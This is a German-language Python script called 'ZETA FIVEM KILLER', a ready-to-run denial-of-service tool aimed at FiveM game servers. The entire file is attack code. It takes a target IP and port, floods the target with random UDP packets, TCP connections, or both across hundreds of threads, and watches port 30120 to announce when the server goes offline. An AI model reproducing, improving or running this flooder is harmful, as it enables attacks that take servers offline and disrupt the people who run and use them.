#!/usr/bin/env python3
# ZETA FIVEM KILLER - Mit Live Connection Tracking
# Zeigt dir genau, wann der Server stirbt

import socket
import threading
import random
import time
import sys
import os
from datetime import datetime

# ============================================
# FARBEN FÜR DIE AUSGABE (Geiler Scheiß)
# ============================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def timestamp():
    return datetime.now().strftime("%H:%M:%S")

def log_success(msg):
    print(f"[{timestamp()}] {Colors.GREEN}✅ {msg}{Colors.END}")

def log_error(msg):
    print(f"[{timestamp()}] {Colors.RED}❌ {msg}{Colors.END}")

def log_info(msg):
    print(f"[{timestamp()}] {Colors.CYAN}ℹ️ {msg}{Colors.END}")

def log_attack(msg):
    print(f"[{timestamp()}] {Colors.YELLOW}💀 {msg}{Colors.END}")

def log_connected(msg):
    print(f"[{timestamp()}] {Colors.GREEN}🔌 Connected to {msg}{Colors.END}")

def log_timeout(msg):
    print(f"[{timestamp()}] {Colors.RED}⏰ TIMEOUT! {msg}{Colors.END}")

def banner():
    print(f"""{Colors.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║      ███████╗████████╗ █████╗      ███████╗██╗  ██╗         ║
║      ╚══███╔╝╚══██╔══╝██╔══██╗     ██╔════╝╚██╗██╔╝         ║
║        ███╔╝   ██║   ███████║     █████╗   ╚███╔╝           ║
║       ███╔╝    ██║   ██╔══██║     ██╔══╝   ██╔██╗           ║
║       ███████╗ ██║   ██║  ██║     ███████╗██╔╝ ██╗          ║
║       ╚══════╝ ╚═╝   ╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝          ║
║                                                              ║
║              F I V E M   K I L L E R   v2.0                 ║
║                   "Live Connection Killer"                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")

# ============================================
# CONNECTION TESTER – Zeigt Live Status
# ============================================

def test_connection(ip, port):
    """Testet, ob der Server erreichbar ist"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def udp_attack_with_tracking(ip, port, threads, duration):
    """UDP Angriff mit Live Tracking der Connections"""
    
    attack_active = True
    packets_sent = 0
    connections_failed = 0
    
    def udp_sender():
        nonlocal packets_sent
        payload = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Socket Optionen für mehr Power
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        
        while attack_active:
            try:
                sock.sendto(payload, (ip, port))
                packets_sent += 1
            except:
                nonlocal connections_failed
                connections_failed += 1
    
    # Threads starten
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=udp_sender)
        t.daemon = True
        t.start()
        thread_list.append(t)
        log_info(f"Angriffs-Thread {i+1} gestartet")
    
    # Live Status Anzeige
    start_time = time.time()
    last_status = time.time()
    
    log_attack(f"💣 ANGRIFF GESTARTET auf {ip}:{port}")
    log_attack(f"⚡ Threads: {threads} | Dauer: {duration}s")
    
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        # Alle 3 Sekunden Status aktualisieren
        if time.time() - last_status >= 3:
            # Teste ob Server noch antwortet
            is_alive = test_connection(ip, 30120)
            
            print(f"\n{Colors.BOLD}┌{'─'*50}┐{Colors.END}")
            log_info(f"📊 Status nach {elapsed}s / {remaining}s verbleibend")
            log_info(f"📦 Pakete gesendet: {packets_sent:,}")
            log_info(f"💥 Fehlgeschlagene Connections: {connections_failed}")
            
            if is_alive:
                log_connected(f"{ip}:{port} {Colors.GREEN}(Server antwortet noch){Colors.END}")
            else:
                log_timeout(f"{ip}:{port} {Colors.RED}(SERVER REAGIERT NICHT MEHR!){Colors.END}")
            
            print(f"{Colors.BOLD}└{'─'*50}┘{Colors.END}\n")
            last_status = time.time()
        
        time.sleep(1)
    
    attack_active = False
    
    # Finalen Status anzeigen
    print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
    log_attack("🏁 ANGRIFF BEENDET")
    
    is_alive = test_connection(ip, 30120)
    if not is_alive:
        log_success(f"SERVER {ip} IST OFFLINE! 🔥")
    else:
        log_error(f"Server {ip} antwortet noch – brauchst mehr Power!")
    
    print(f"{Colors.BOLD}{'='*60}{Colors.END}\n")

# ============================================
# TCP CONNECTION FLOOD (Frisst Connection Table)
# ============================================

def tcp_attack_with_tracking(ip, port, threads, duration):
    """TCP SYN Flood – füllt die Connection-Tabelle"""
    
    attack_active = True
    connections_opened = 0
    connections_timedout = 0
    
    def tcp_connect():
        nonlocal connections_opened, connections_timedout
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                connections_opened += 1
                log_connected(f"{ip}:{port} (Connection #{connections_opened})")
                time.sleep(0.01)  # Kurze Pause
            except socket.timeout:
                connections_timedout += 1
                log_timeout(f"{ip}:{port} (Timeout #{connections_timedout})")
            except:
                connections_timedout += 1
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    # Threads starten
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=tcp_connect)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    log_attack(f"🔌 TCP CONNECTION FLOOD gestartet auf {ip}:{port}")
    
    # Live Anzeige
    start_time = time.time()
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        print(f"\n[{timestamp()}] 📊 TCP Status: {connections_opened} Verbindungen | {connections_timedout} Timeouts | {remaining}s verbleibend")
        time.sleep(5)
    
    attack_active = False
    log_attack("🏁 TCP Angriff beendet")

# ============================================
# MAIN MENU
# ============================================

def main():
    clear_screen()
    banner()
    
    print(f"{Colors.BOLD}{Colors.YELLOW}┌{'─'*50}┐{Colors.END}")
    print(f"{Colors.BOLD}│  🎯 ZIEL KONFIGURATION{Colors.END}{' ' * 32}{Colors.BOLD}│{Colors.END}")
    print(f"{Colors.BOLD}└{'─'*50}┘{Colors.END}\n")
    
    # IP eingeben
    target_ip = input(f"{Colors.CYAN}🌐 Server IP: {Colors.END}")
    if not target_ip:
        target_ip = "127.0.0.1"
    
    # Port eingeben
    target_port_input = input(f"{Colors.CYAN}🔌 Port (Standard 30120): {Colors.END}")
    target_port = int(target_port_input) if target_port_input else 30120
    
    # Angriffsart wählen
    print(f"\n{Colors.BOLD}┌{'─'*50}┐{Colors.END}")
    print(f"{Colors.BOLD}│  💀 ANGRIFFSART{Colors.END}{' ' * 34}{Colors.BOLD}│{Colors.END}")
    print(f"{Colors.BOLD}└{'─'*50}┘{Colors.END}\n")
    print("  [1] UDP Flood (Standard – für FiveM)")
    print("  [2] TCP Connection Flood (Frisst Connection Table)")
    print("  [3] Kombinierter Angriff (Beides gleichzeitig)")
    
    attack_type = input(f"\n{Colors.CYAN}Wähle (1-3): {Colors.END}")
    
    # Threads
    threads_input = input(f"{Colors.CYAN}⚡ Threads (200-2000, Standard 500): {Colors.END}")
    threads = int(threads_input) if threads_input else 500
    
    # Dauer
    duration_input = input(f"{Colors.CYAN}⏱️ Dauer in Sekunden (0 = unendlich, Standard 60): {Colors.END}")
    duration = int(duration_input) if duration_input else 60
    
    # Bestätigung
    print(f"\n{Colors.BOLD}{Colors.YELLOW}┌{'─'*50}┐{Colors.END}")
    print(f"{Colors.BOLD}│  ⚠️  LETZTE BESTÄTIGUNG{Colors.END}{' ' * 30}{Colors.BOLD}│{Colors.END}")
    print(f"{Colors.BOLD}└{'─'*50}┘{Colors.END}")
    print(f"\n  Ziel: {target_ip}:{target_port}")
    print(f"  Angriffsart: {attack_type}")
    print(f"  Threads: {threads}")
    print(f"  Dauer: {duration}s")
    
    confirm = input(f"\n{Colors.RED}🚨 Angriff starten? (ja/nein): {Colors.END}")
    if confirm.lower() != "ja":
        print("Abgebrochen.")
        sys.exit(0)
    
    clear_screen()
    banner()
    
    # Teste ob Server vor dem Angriff erreichbar ist
    log_info(f"Teste Verbindung zu {target_ip}:{target_port}...")
    if test_connection(target_ip, target_port):
        log_connected(f"{target_ip}:{target_port}")
    else:
        log_error(f"{target_ip}:{target_port} nicht erreichbar – Angriff vielleicht sinnlos")
    
    print("\n")
    
    # Angriff starten
    if attack_type == "1":
        udp_attack_with_tracking(target_ip, target_port, threads, duration)
    elif attack_type == "2":
        tcp_attack_with_tracking(target_ip, target_port, threads, duration)
    elif attack_type == "3":
        # Beides gleichzeitig
        log_attack("Starte KOMBINIERTEN Angriff...")
        tcp_thread = threading.Thread(target=tcp_attack_with_tracking, args=(target_ip, target_port, threads//2, duration))
        tcp_thread.start()
        udp_attack_with_tracking(target_ip, target_port, threads//2, duration)
        tcp_thread.join()
    
    input("\nDrücke Enter zum Beenden...")

if __name__ == "__main__":
    main()